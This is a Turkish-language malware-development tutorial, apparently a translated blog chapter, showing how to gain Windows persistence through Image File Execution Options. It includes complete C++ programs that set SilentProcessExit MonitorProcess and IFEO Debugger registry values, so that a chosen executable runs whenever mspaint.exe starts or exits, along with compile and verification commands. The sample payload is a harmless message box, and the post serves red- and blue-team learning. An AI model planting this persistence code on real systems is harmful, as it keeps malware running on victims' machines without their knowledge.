\newpage
\subsection{76. malware development: persistence - part 10. Using Image File Execution Options. Simple C++ example.}

﷽

![pers](./images/68/2022-09-11_16-19.png){width="80%"}    

Bu gönderi, Image File Execution Options (IFEO) aracılığıyla gerçekleştirilen ilginç bir kötü amaçlı yazılım kalıcılığı tekniği üzerine yaptığım kendi araştırmamın sonucudur.     

### Image File Execution Options   

IFEO, geliştiricilerin bir uygulamaya veya sürece hata ayıklayıcı eklemesine olanak tanır. Bu, hata ayıklayıcının/uygulamanın hata ayıklanan uygulama ile eşzamanlı olarak çalışmasını sağlar.    

Bu özelliği nasıl ayarlayabiliriz? Belirli bir uygulama sessizce sonlandığında bir işlem/program başlatabiliriz.
Bir uygulamanın sessizce sona ermesi (*Silent exit*), aşağıdaki iki şekilde gerçekleştiği anlamına gelir:    

1. Uygulamanın `ExitProcess` çağrısı yaparak kendisini sonlandırması    
2. Başka bir sürecin `TerminateProcess` çağrısı yaparak izlenen süreci sonlandırması    

Bu, aşağıdaki kayıt defteri anahtarı aracılığıyla yapılandırılabilir:    

`HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit`        

### pratik örnek

Microsoft Paint (`mspaint.exe`) sessizce sonlandığında kötü amaçlı yazılımımızın çalıştırılmasını sağlayalım.     

Diyelim ki elimizde "kötü amaçlı yazılımımız" (`hack.cpp`) var:   

```cpp
/*
hack.cpp
evil app for windows persistence via IFEO
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Gördüğünüz gibi, her zamanki gibi “meow-meow” mesaj kutusu “kötü amaçlı yazılımını” kullanıyorum =^..^=    

Ardından, kayıt defterini değiştirmek için kalıcılık sağlama betiğini oluşturun (`pers.cpp`):     

```cpp
/*
pers.cpp
windows persistence via IFEO (GlobalFlag)
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  DWORD gF = 512;
  DWORD rM = 1;

  // image file
  const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image 
  File Execution Options\\mspaint.exe";

  // silent exit
  const char* silent = "SOFTWARE\\Microsoft\\Windows 
  NT\\CurrentVersion\\SilentProcessExit\\mspaint.exe";

  // evil app
  const char* exe = "Z:\\2022-09-10-malware-pers-10\\hack.exe";

  // GlobalFlag
  // LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe", 0 , KEY_WRITE, &hkey);
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL, 
  REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    // reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 
    // Execution Options\mspaint.exe" /v GlobalFlag /t REG_DWORD /d 512
    RegSetValueEx(hkey, (LPCSTR)"GlobalFlag", 0, REG_DWORD, (const BYTE*)&gF, sizeof(gF));
    RegCloseKey(hkey);
  }

  // res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)
  //"SOFTWARE\\Microsoft\\Windows 
  //NT\\CurrentVersion\\SilentProcessExit\\mspaint.exe", 0 , KEY_WRITE, &hkey);
  res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)silent, 0, NULL, 
  REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    // reg add "HKLM\SOFTWARE\Microsoft\Windows 
    // NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t 
    // REG_DWORD /d 1
    // reg add "HKLM\SOFTWARE\Microsoft\Windows 
    // NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d 
    // "Z:\..\hack.exe"
    RegSetValueEx(hkey, (LPCSTR)"ReportingMode", 0, REG_DWORD, 
    (const BYTE*)&rM, sizeof(rM));
    RegSetValueEx(hkey, (LPCSTR)"MonitorProcess", 0, REG_SZ, 
    (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Peki burada ne yaptık? Öncelikle, `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion` altında `SilentProcessExit` anahtarını oluşturduk, ardından `GlobalFlag` ekleyerek sessiz süreç çıkış izleme özelliğini etkinleştirdik:   

```cpp
//...

LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL, 
REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);

//...
//...

// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 
// Execution Options\mspaint.exe" /v GlobalFlag /t REG_DWORD /d 512
RegSetValueEx(hkey, (LPCSTR)"GlobalFlag", 0, REG_DWORD, 
(const BYTE*)&gF, sizeof(gF));
//...
```

`MonitorProcess` değerini `...\hack.exe` olarak ve `ReportingMode` değerini `1` olarak ayarlayarak, `mspaint.exe` her sessiz çıkış yaptığında `hack.exe` adlı "zararlı yazılımımızın" çalışmasını tetiklemiş olduk:    

```cpp
//...

RegSetValueEx(hkey, (LPCSTR)"ReportingMode", 0, REG_DWORD, 
(const BYTE*)&rM, sizeof(rM));
RegSetValueEx(hkey, (LPCSTR)"MonitorProcess", 0, REG_SZ, (unsigned char*)exe, 
strlen(exe));
```

### demo

Bu işlemi görmek için zararlı yazılımı derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/68/2022-09-11_15-52.png){width="80%"}    

Çalıştırın ve doğruluğunu kontrol edin:    

![pers](./images/68/2022-09-11_16-03.png){width="80%"}    


Öncelikle kayıt defteri anahtarlarını kontrol edin:    

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s
```

![pers](./images/68/2022-09-11_15-58.png){width="80%"}    

Ayrıca `SilentProcessExit` anahtarını da kontrol edin:    

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit" /s
```

![pers](./images/68/2022-09-11_16-00.png){width="80%"}    

Gördüğünüz gibi, beklendiği gibi, hedef uygulamamız için bazı kayıt defteri anahtarları eksik. Bu nedenle, uygulama başlatıldığında ve kapatıldığında hiçbir şey olmuyor:    

![pers](./images/68/2022-09-11_16-05.png){width="80%"}    

![pers](./images/68/2022-09-11_16-05_1.png){width="80%"}    

Peki, şimdi derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/68/2022-09-11_15-53.png){width="80%"}    

ve kalıcılık için scriptimizi (`pers.exe`) çalıştırın, ardından kayıt defteri anahtarlarını tekrar kontrol edin:     

```powershell
.\pers.exe
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s
```

![pers](./images/68/2022-09-11_16-10.png){width="80%"}    

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit" /s
```

![pers](./images/68/2022-09-11_16-11.png){width="80%"}    

Son olarak, `mspaint.exe`'yi tekrar çalıştırın:    

![pers](./images/68/2022-09-11_16-15.png){width="80%"}    

![pers](./images/68/2022-09-11_16-16.png){width="80%"}    

ve kapatalım:    

![pers](./images/68/2022-09-11_16-17.png){width="80%"}    

`ReportingMode` kayıt defteri anahtarı, Windows Hata Bildirme işlemini (`WerFault.exe`) etkinleştirir, bu da `MonitorProcess` anahtar değerinin (`hack.exe`) üst süreci olacaktır:    

![pers](./images/68/2022-09-12_02-26.png){width="80%"}    

> `WerFault.exe` - işletim sistemi, Windows özellikleri ve uygulamalarla ilgili hataları izlemek için kullanılır.    

### IFEO hata ayıklayıcı türü (IFEO debugger type)

IFEO'nun başka bir uygulaması debugger anahtarı üzerinden yapılabilir.    
Sadece şu kayıt defteri anahtarında bir hata ayıklayıcı oluşturun:    

`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe`     

Böylece, yalnızca kötü amaçlı uygulamanın `System32` içine kaydedilmesi yeterlidir.    

Kaynak kodu basittir ve şu şekilde görünmektedir:    

```cpp
/*
pers2.cpp
windows persistence via IFEO 2(Debugger)
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  DWORD gF = 512;
  DWORD rM = 1;

  // image file
  const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image 
  File Execution Options\\mspaint.exe";

  // evil app
  const char* exe = "hack.exe";

  // Debugger
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL, 
  REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    // reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 
    // Execution Options\mspaint.exe" /v Debugger /d "hack.exe"
    RegSetValueEx(hkey, (LPCSTR)"Debugger", 0, REG_SZ, (unsigned char*)exe, 
    strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
```

ve şu kodu derleyelim:   

```bash
x86_64-w64-mingw32-g++ -O2 pers2.cpp -o pers2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/68/2022-09-12_03-00.png){width="80%"}    

Bunun nasıl çalıştığını gösteren bir örnek:    

![pers](./images/68/2022-09-12_03-03.png){width="80%"}    

![pers](./images/68/2022-09-12_03-06.png){width="80%"}    

![pers](./images/68/2022-09-12_03-06_1.png){width="80%"}    

![pers](./images/68/2022-09-12_03-06_2.png){width="80%"}    

![pers](./images/68/2022-09-12_03-07.png){width="80%"}    

Microsoft Paint (`mspaint.exe`) süreci başlatıldığında, bu kötü amaçlı yazılımın çalışmasına neden olacaktır. Mükemmel!    

Bu kalıcılık tekniği, [APT29](https://attack.mitre.org/groups/G0016/) grubu ve [SUNBURST](https://attack.mitre.org/software/S0559/) gibi yazılımlar tarafından gerçek dünyada kullanılmıştır.

Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.    

[ATT&CK MITRE: IFEO Injection](https://attack.mitre.org/techniques/T1183/)    
[MSDN: Monitoring Silent Process Exit](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit)      
[Persistence using GlobalFlags in Image File Execution Options - Hidden from autoruns.exe](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/)     
[APT29](https://attack.mitre.org/groups/G0016/)     
[SUNBURST](https://attack.mitre.org/software/S0559/)    
[Github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-09-10-malware-pers-10)    
